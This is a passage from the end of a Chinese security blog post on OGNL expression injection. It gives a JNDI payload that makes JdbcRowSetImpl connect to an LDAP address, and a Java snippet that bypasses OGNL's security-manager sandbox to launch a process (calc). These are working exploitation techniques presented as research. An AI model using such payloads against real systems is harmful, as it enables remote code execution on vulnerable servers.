+</span></span><span class=line><span class=cl><span class=err>#</span><span class=n>rw</span><span class=o>=</span><span class=err>#</span><span class=n>InstanceManager</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=err>&#39;</span><span class=n>com</span><span class=o>.</span><span class=na>sun</span><span class=o>.</span><span class=na>rowset</span><span class=o>.</span><span class=na>JdbcRowSetImpl</span><span class=err>&#39;</span><span class=o>),</span>
+</span></span><span class=line><span class=cl><span class=err>#</span><span class=n>rw</span><span class=o>.</span><span class=na>setDataSourceName</span><span class=o>(</span><span class=err>&#39;</span><span class=n>ldap</span><span class=o>:</span><span class=c1>//127.0.0.1:10086/InstanceManager&#39;),
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>#</span><span class=n>rw</span><span class=o>.</span><span class=na>getDatabaseMetaData</span><span class=o>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>最后，如果靶机使用了 <code>Ognl</code> 官方的沙箱： <code>System.setProperty("ognl.security.manager","true");</code> ，且使用了默认的 <code>MemeberAccess</code> ，那么可以使用如下方式进行绕过：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm> * Bypass OGNL sandbox
+</span></span></span><span class=line><span class=cl><span class=cm> */</span>
+</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>bypassSandBox</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>setProperty</span><span class=o>(</span><span class=s>&#34;ognl.security.manager&#34;</span><span class=o>,</span><span class=s>&#34;true&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>HashMap</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>rootMap</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HashMap</span><span class=o>&lt;&gt;(</span><span class=n>1</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>rootMap</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;test&#34;</span><span class=o>,</span><span class=s>&#34;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.setAllowPackageProtectedAccess(true),#cmd=new String[]{&#39;calc&#39;},@java.lang.ProcessImpl@start(#cmd,null,null,null,false)&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>setRoot</span><span class=o>(</span><span class=n>rootMap</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>express</span> <span class=o>=</span> <span class=s>&#34;(test)(&#39;fuckOgnl&#39;)&#34;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>express</span><span class=o>,</span><span class=n>context</span><span class=o>,</span> <span class=n>context</span><span class=o>.</span><span class=na>getRoot</span><span class=o>());</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=参考链接>参考链接</h2><ul><li><a href=https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/>https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></li><li><a href=https://commons.apache.org/proper/commons-ognl/language-guide.html>https://commons.apache.org/proper/commons-ognl/language-guide.html</a></li></ul></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content>P1n93r</span></p><p class=copyright-item><span class=item-title>上次更新</span>
+<span class=item-content>2021-06-15</span></p></div><footer class=post-footer><nav class=post-nav><a class=prev href=/post/security/mysql_jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/><i class="iconfont icon-left"></i>
+<span class="prev-text nav-default">MySQL_JDBC反序列化</span>
+<span class="prev-text nav-mobile">上一篇</span></a>
+<a class=next href=/post/security/pebble%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/><span class="next-text nav-default">Pebble安全研究</span>
+<span class="next-text nav-mobile">下一篇</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="p1n93r",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:pin83r@gmail.com class="iconfont icon-email" title=email></a>
+<a href=https://github.com/p1n93r class="iconfont icon-github" title=github></a>
+<a href=https://p1n93r.github.io/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
+<span class=division>|</span>
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量 <span id=busuanzi_value_site_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次</span>
+<span class=division>|</span>
+<span id=busuanzi_container_site_uv>本站总访客数 <span id=busuanzi_value_site_uv><img src=/img/spinner.svg alt=spinner.svg></span> 人</span></div><span class=copyright-year>&copy;
+2019 -
+2022<span class=heart><i class="iconfont icon-heart"></i></span><span>P1n93r</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js></script></body></html>
